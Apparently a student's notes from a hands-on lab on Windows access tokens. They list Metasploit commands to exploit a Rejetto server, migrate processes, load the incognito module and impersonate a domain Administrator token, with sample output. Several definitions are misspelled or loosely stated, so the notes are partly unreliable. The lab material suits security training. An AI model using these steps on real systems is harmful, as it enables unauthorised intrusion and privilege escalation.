#### Windows Access Token
	- Core element of authentication in Windows
	- Manageed by the Security Authority Subsystem Service
	- Describes the secuirty context of a process or thread
	- Generated by the winlogon.exe
	- Token attatches to the uerinit.exe process, all child process started by that obtain a copy of that token

	- Security Levels of Access Token
		- Impersonate-level tokens
			- Domain Logons or System Service Logons
			- Used on the local system
		- Delegate-level tokens
			- Traditional Logons or through remote access (RDP)
			- Can be used on any System

#### Windows Privileges 

	- SeAssignmPrimaryToken 
		- Impersonate tokens
	- SeCreateToekn 
		- Random token with admin privileges
	- SeImpersonatPrivilege 
		- Can create a proccess under admin privileges

#### The Incognito Module
	- Module for impersonating tokens after exploitation
	- List available tokens for impersonation

#### Tools
msfconsole
pgrep 
migrate

#### Commands

Exploit rejetto with msfconsole
```
msfconsole 
search rejetto
show options
set RHOSTS target_ip 
exploit
```

Migrate Architecture
```
pgrep explorer
migrate process_id
```

Check privs
```
getprivs
```

Load incognito
```
load incognito 

Loading extension incognito...Success.
```

List available tokens
```
list_tokens -u

Delegation Tokens Available
========================================
ATTACKDEFENSE\Administrator
NT AUTHORITY\LOCAL SERVICE

Impersonation Tokens Available
========================================
No tokens available

```

Impersonate token
```
impersonate_token  ATTACKDEFENSE\\Administrator
```

# Task: Privilege Escalation: Impersonate

**Estimated time:** 10 minutes

## Goal

This lab covers the process of impersonating access tokens on Windows with meterpreter's in-built Incognito module.

## Pre-requisites

1. Basic familiarity with Nmap.
2. Basic Familiarity with Metasploit.

## Requirements

This task does not have any requirements.